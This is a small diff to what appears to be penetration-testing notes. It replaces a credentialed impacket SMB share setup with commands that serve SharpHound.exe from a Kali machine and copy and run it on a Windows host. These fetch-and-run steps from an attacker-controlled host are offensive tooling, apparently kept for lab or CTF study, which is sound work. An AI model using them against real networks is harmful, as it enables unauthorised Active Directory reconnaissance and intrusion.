@@ -16,19 +16,19 @@ coverY: 0
 On Kali:
 
 ```
-impacket-smbserver smbserver $(pwd) -smb2support -user hacker -password password
+impacket-smbserver smb .
 ```
 
 On Windows:
 
 ```
-$pass = convertto-securestring 'password' -AsPlainText -Force
+net use \\kali-ip\smb
 
-$cred = New-Object System.Management.Automation.PSCredential('hacker',$pass)
+copy \\kali-ip\smb\SharpHound.exe .
 
-New-PSDrive -Name hacker -PSProvider FileSystem -Credential $cred -Root \\10.10.16.12\smbserver
+dir
 
-cd hacker:
+SharpHound.exe
 ```
 
 * Be sure to open up the file through the file manager on Linux (GUI)
